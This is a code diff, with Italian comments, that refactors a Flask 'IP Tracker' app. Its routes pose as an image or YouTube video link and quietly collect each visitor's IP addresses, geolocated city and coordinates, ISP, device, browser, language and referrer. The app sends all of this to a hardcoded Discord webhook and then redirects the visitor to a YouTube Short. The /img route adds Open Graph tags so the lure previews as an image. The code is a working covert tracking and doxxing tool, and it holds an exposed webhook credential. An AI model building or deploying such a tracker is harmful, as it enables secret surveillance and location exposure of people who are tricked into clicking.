@@ -7,11 +7,12 @@ import time
 
 app = Flask(__name__)
 
-# TUO WEBHOOK PERSONALE
+# ============ CONFIGURAZIONE ============
 WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
-
-# Immagine da mostrare
 IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"
+REDIRECT_URL = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"
+
+# ============ FUNZIONI ============
 
 def get_ip_info(ip):
     """Ottiene info geolocalizzazione complete"""
@@ -41,8 +42,8 @@ def get_ip_info(ip):
                     "proxy": data.get("proxy", False),
                     "hosting": data.get("hosting", False)
                 }
-    except Exception as e:
-        print(f"Errore API: {e}")
+    except:
+        pass
     return None
 
 def get_device_info(request):
@@ -50,260 +51,151 @@ def get_device_info(request):
     ua = request.headers.get('User-Agent', '')
     
     info = {
-        "user_agent": ua[:300],
         "browser": "Sconosciuto",
-        "browser_version": "?",
+        "browser_version": "",
         "os": "Sconosciuto",
-        "os_version": "?",
+        "os_version": "",
         "device": "Desktop",
         "is_mobile": False,
-        "is_tablet": False,
         "is_bot": False
     }
     
-    # Detect Bot
-    bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
-    if any(bot in ua.lower() for bot in bots):
-        info["is_bot"] = True
-    
-    # Detect OS
-    if 'Windows NT 10' in ua:
-        info["os"] = "Windows 10/11"
-    elif 'Windows NT 6.3' in ua:
-        info["os"] = "Windows 8.1"
-    elif 'Windows NT 6.1' in ua:
-        info["os"] = "Windows 7"
-    elif 'Mac OS X' in ua:
-        info["os"] = "macOS"
-        version = re.search(r'Mac OS X (\d+[._]\d+)', ua)
-        if version:
-            info["os_version"] = version.group(1).replace('_', '.')
-    elif 'Linux' in ua and 'Android' not in ua:
-        info["os"] = "Linux"
+    # OS Detection
+    if 'Windows NT 10' in ua: info["os"] = "Windows 10/11"
+    elif 'Mac OS X' in ua: info["os"] = "macOS"
     elif 'Android' in ua:
         info["os"] = "Android"
         info["is_mobile"] = True
         info["device"] = "Mobile"
-        version = re.search(r'Android (\d+\.\d+)', ua)
-        if version:
-            info["os_version"] = version.group(1)
+        v = re.search(r'Android (\d+\.\d+)', ua)
+        if v: info["os_version"] = v.group(1)
     elif 'iPhone' in ua:
-        info["os"] = "iOS (iPhone)"
+        info["os"] = "iOS"
         info["is_mobile"] = True
-        info["device"] = "Mobile"
+        info["device"] = "iPhone"
     elif 'iPad' in ua:
-        info["os"] = "iOS (iPad)"
-        info["is_tablet"] = True
-        info["device"] = "Tablet"
+        info["os"] = "iOS"
+        info["device"] = "iPad"
+    elif 'Linux' in ua: info["os"] = "Linux"
     
-    # Detect Browser
+    # Browser Detection
     if 'Edg/' in ua:
         info["browser"] = "Edge"
-        version = re.search(r'Edg/(\d+)', ua)
-        if version: info["browser_version"] = version.group(1)
+        v = re.search(r'Edg/(\d+)', ua)
+        if v: info["browser_version"] = v.group(1)
     elif 'Firefox/' in ua:
         info["browser"] = "Firefox"
-        version = re.search(r'Firefox/(\d+)', ua)
-        if version: info["browser_version"] = version.group(1)
-    elif 'Chrome/' in ua and 'Safari/' in ua:
+        v = re.search(r'Firefox/(\d+)', ua)
+        if v: info["browser_version"] = v.group(1)
+    elif 'Chrome/' in ua:
         info["browser"] = "Chrome"
-        version = re.search(r'Chrome/(\d+)', ua)
-        if version: info["browser_version"] = version.group(1)
-    elif 'Safari/' in ua and 'Chrome' not in ua:
-        info["browser"] = "Safari"
-        version = re.search(r'Version/(\d+)', ua)
-        if version: info["browser_version"] = version.group(1)
-    elif 'Opera' in ua or 'OPR/' in ua:
-        info["browser"] = "Opera"
+        v = re.search(r'Chrome/(\d+)', ua)
+        if v: info["browser_version"] = v.group(1)
+    elif 'Safari/' in ua: info["browser"] = "Safari"
+    
+    # Bot Detection
+    bots = ['bot', 'crawler', 'spider', 'curl', 'wget']
+    if any(b in ua.lower() for b in bots): info["is_bot"] = True
     
     return info
 
 def get_all_ips(request):
-    """Estrae TUTTI gli IP: pubblico, privati, proxy"""
+    """Estrae tutti gli IP dalla richiesta"""
     ips = {
-        "ip_pubblico_rete": "N/D",
-        "ip_privato_locale": "N/D",
-        "ip_proxy": "N/D",
-        "x_forwarded_for": "N/D",
-        "x_real_ip": "N/D",
+        "ip_pubblico": "N/D",
+        "ip_locale": "N/D",
         "remote_addr": request.remote_addr
     }
     
-    # X-Forwarded-For (contiene tutti gli IP della catena)
     forwarded = request.headers.get('X-Forwarded-For', '')
     if forwarded:
-        ips["x_forwarded_for"] = forwarded
-        # Il primo IP è il client reale, l'ultimo è il proxy più vicino
         ip_list = [ip.strip() for ip in forwarded.split(',')]
         if ip_list:
-            ips["ip_pubblico_rete"] = ip_list[0]  # IP pubblico del router
-            if len(ip_list) > 1:
-                ips["ip_proxy"] = ip_list[-1]  # Ultimo proxy
+            ips["ip_pubblico"] = ip_list[0]
     
-    # X-Real-IP
-    real_ip = request.headers.get('X-Real-IP', '')
-    if real_ip:
-        ips["x_real_ip"] = real_ip
-    
-    # IP locale (dal remote_addr se è privato)
-    remote = request.remote_addr
-    if remote.startswith(('192.168.', '10.', '172.', '127.')):
-        ips["ip_privato_locale"] = remote
+    if request.remote_addr.startswith(('192.168.', '10.', '172.', '127.')):
+        ips["ip_locale"] = request.remote_addr
     
     return ips
 
-def send_to_discord(ip_data, ip_info, device_info, request_info, route_name):
-    """Invia TUTTO in un unico embed compatto"""
+def send_to_discord(ip_data, ip_info, device_info, route_name):
+    """Invia report completo a Discord"""
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
+    ua = request.headers.get('User-Agent', '')[:200]
+    lang = request.headers.get('Accept-Language', 'N/D')
+    referrer = request.headers.get('Referer', 'N/D')
     
-    # Costruisci la descrizione con TUTTE le info
-    description = f"**📅 Data e Ora:** `{date}`\n"
+    description = f"**📅 Data:** `{date}`\n"
     description += f"**🛤️ Route:** `{route_name}`\n\n"
     
-    # IP Info
-    description += "**══════ 🌐 INDIRIZZI IP ══════**\n"
-    description += f"**🔢 IP Pubblico (Rete):** `{ip_data['ip_pubblico_rete']}`\n"
-    if ip_data['ip_privato_locale'] != 'N/D':
-        description += f"**🏠 IP Privato (Locale):** `{ip_data['ip_privato_locale']}`\n"
-    if ip_data['ip_proxy'] != 'N/D':
-        description += f"**🔗 Proxy/VPN:** `{ip_data['ip_proxy']}`\n"
-    description += f"**📡 Remote Addr:** `{ip_data['remote_addr']}`\n"
-    if ip_data['x_forwarded_for'] != 'N/D':
-        description += f"**📋 X-Forwarded-For:** `{ip_data['x_forwarded_for'][:100]}`\n"
+    # IP
+    description += "**🌐 INDIRIZZI IP**\n"
+    description += f"🔢 Pubblico: `{ip_data['ip_pubblico']}`\n"
+    if ip_data['ip_locale'] != 'N/D':
+        description += f"🏠 Locale: `{ip_data['ip_locale']}`\n"
     
     # Posizione
     if ip_info:
-        description += "\n**══════ 📍 POSIZIONE ══════**\n"
-        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')} ({ip_info.get('countryCode', 'N/D')})\n"
-        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}, {ip_info.get('region', 'N/D')} {ip_info.get('zip', 'N/D')}\n"
-        description += f"**📍 Coordinate:** {ip_info.get('lat', 'N/D')}, {ip_info.get('lon', 'N/D')}\n"
-        description += f"**🕐 Timezone:** {ip_info.get('timezone', 'N/D')}\n"
-        description += f"**📡 ISP:** {ip_info.get('isp', 'N/D')}\n"
-        description += f"**🏢 Org:** {ip_info.get('org', 'N/D')}\n"
-        description += f"**🔢 AS:** {ip_info.get('as', 'N/D')} ({ip_info.get('asname', 'N/D')})\n"
-        description += f"**🔄 Reverse DNS:** {ip_info.get('reverse', 'N/D')}\n"
-        
-        # Flags
+        description += "\n**📍 POSIZIONE**\n"
+        description += f"🌍 {ip_info.get('country', '?')} - {ip_info.get('city', '?')}, {ip_info.get('region', '?')}\n"
+        description += f"📍 {ip_info.get('lat', '?')}, {ip_info.get('lon', '?')}\n"
+        description += f"📡 {ip_info.get('isp', '?')}\n"
         flags = []
-        if ip_info.get('mobile'): flags.append("📱 Mobile")
-        if ip_info.get('proxy'): flags.append("🔒 Proxy/VPN")
-        if ip_info.get('hosting'): flags.append("🏢 Hosting/Server")
-        if flags:
-            description += f"**🚩 Flag:** {' | '.join(flags)}\n"
+        if ip_info.get('mobile'): flags.append("📱")
+        if ip_info.get('proxy'): flags.append("🔒")
+        if flags: description += f"🚩 {' '.join(flags)}\n"
     
     # Dispositivo
-    if device_info:
-        description += "\n**══════ 💻 DISPOSITIVO ══════**\n"
-        description += f"**🖥️ OS:** {device_info.get('os', 'N/D')} {device_info.get('os_version', '')}\n"
-        description += f"**🌐 Browser:** {device_info.get('browser', 'N/D')} v{device_info.get('browser_version', '')}\n"
-        description += f"**📱 Tipo:** {device_info.get('device', 'N/D')}\n"
-        if device_info.get('is_bot'):
-            description += f"**🤖 BOT RILEVATO!**\n"
-        description += f"**🔤 Lingue:** {request_info.get('accept_language', 'N/D')[:80]}\n"
-        description += f"**🆔 UA:** `{device_info.get('user_agent', 'N/D')[:150]}`\n"
-    
-    # Richiesta
-    description += "\n**══════ 📡 RICHIESTA ══════**\n"
-    description += f"**🔗 Referrer:** {request_info.get('referrer', 'N/D')[:80]}\n"
-    description += f"**📋 Metodo:** {request_info.get('method', 'N/D')}\n"
-    description += f"**🚫 DNT:** {request_info.get('dnt', 'N/D')}\n"
-    description += f"**🍪 Cookies:** {request_info.get('cookies', 0)}\n"
+    description += "\n**💻 DISPOSITIVO**\n"
+    description += f"🖥️ {device_info['os']} | 🌐 {device_info['browser']} {device_info['browser_version']}\n"
+    description += f"📱 {device_info['device']}\n"
+    if lang: description += f"🔤 {lang[:80]}\n"
+    if referrer != 'N/D': description += f"🔗 {referrer[:80]}\n"
     
     data = {
-        "content": f"🔔 **Nuovo Accesso!** | `{ip_data['ip_pubblico_rete']}` | {ip_info.get('country', '?') if ip_info else '?'}",
+        "content": f"🔔 **{ip_info.get('country', '?')}** - `{ip_data['ip_pubblico']}`",
         "embeds": [{
-            "title": "🎯 REPORT COMPLETO",
+            "title": "🎯 REPORT",
             "description": description,
             "color": 5814783,
             "timestamp": date,
-            "footer": {
-                "text": "IP Tracker Pro"
-            }
+            "footer": {"text": "IP Tracker"}
         }]
     }
     
     try:
-        response = requests.post(WEBHOOK_URL, json=data)
-        if response.status_code == 204:
-            print(f"✅ Inviato")
-        elif response.status_code == 429:
-            time.sleep(2)
-            response = requests.post(WEBHOOK_URL, json=data)
-        else:
-            print(f"❌ Errore: {response.status_code}")
-    except Exception as e:
-        print(f"❌ Eccezione: {e}")
+        requests.post(WEBHOOK_URL, json=data, timeout=10)
+    except:
+        pass
+
+# ============ ROUTES ============
 
 @app.route("/")
-def index():
+def home():
     ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    ip_info = get_ip_info(ip_data["ip_pubblico"])
     device_info = get_device_info(request)
-    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
-                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
-                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
-    send_to_discord(ip_data, ip_info, device_info, request_info, "Home")
-    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
+    send_to_discord(ip_data, ip_info, device_info, "Home")
+    return redirect(REDIRECT_URL)
 
 @app.route("/img")
-@app.route("/image")
-@app.route("/photo")
-@app.route("/pic")
-def image_tracker():
+def image():
     ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    ip_info = get_ip_info(ip_data["ip_pubblico"])
     device_info = get_device_info(request)
-    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
-                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
-                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
-    send_to_discord(ip_data, ip_info, device_info, request_info, "Immagine")
-    
-    return f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta property="og:title" content="Guarda questa immagine!">
-        <meta property="og:description" content="Clicca per vederla meglio">
-        <meta property="og:image" content="{IMAGE_URL}">
-        <meta property="og:type" content="website">
-        <meta name="twitter:card" content="summary_large_image">
-        <style>
-            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-            body {{ background: #1a1a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; cursor: pointer; font-family: Arial, sans-serif; }}
-            .container {{ text-align: center; padding: 20px; }}
-            .container img {{ max-width: 90vw; max-height: 80vh; border-radius: 10px; box-shadow: 0 0 30px rgba(255,255,255,0.1); transition: all 0.3s ease; }}
-            .container img:hover {{ transform: scale(1.02); box-shadow: 0 0 40px rgba(255,255,255,0.2); }}
-            .container p {{ color: #888; margin-top: 15px; font-size: 14px; }}
-        </style>
-    </head>
-    <body onclick="redirectToVideo()">
-        <div class="container">
-            <img src="{IMAGE_URL}" alt="Clicca qui" id="mainImage">
-            <p>Clicca sull'immagine per continuare...</p>
-        </div>
-        <script>
-            function redirectToVideo() {{ window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"; }}
-            document.getElementById('mainImage').addEventListener('click', function(e) {{ redirectToVideo(); }});
-        </script>
-    </body>
-    </html>
-    """
+    send_to_discord(ip_data, ip_info, device_info, "Immagine")
+    return f"""<!DOCTYPE html><html><head><meta property="og:title" content="Guarda!"><meta property="og:image" content="{IMAGE_URL}"><style>*{{margin:0;padding:0}}body{{background:#1a1a1a;display:flex;justify-content:center;align-items:center;height:100vh;cursor:pointer}}img{{max-width:90vw;max-height:80vh;border-radius:10px}}</style></head><body onclick="location.href='{REDIRECT_URL}'"><img src="{IMAGE_URL}"></body></html>"""
 
 @app.route("/video")
 @app.route("/shorts")
-@app.route("/watch")
-@app.route("/yt")
-def video_preview():
+def video():
     ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
+    ip_info = get_ip_info(ip_data["ip_pubblico"])
     device_info = get_device_info(request)
-    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
-                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
-                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
-    send_to_discord(ip_data, ip_info, device_info, request_info, "Video")
-    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
+    send_to_discord(ip_data, ip_info, device_info, "Video")
+    return redirect(REDIRECT_URL)
 
+# ============ AVVIO ============
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
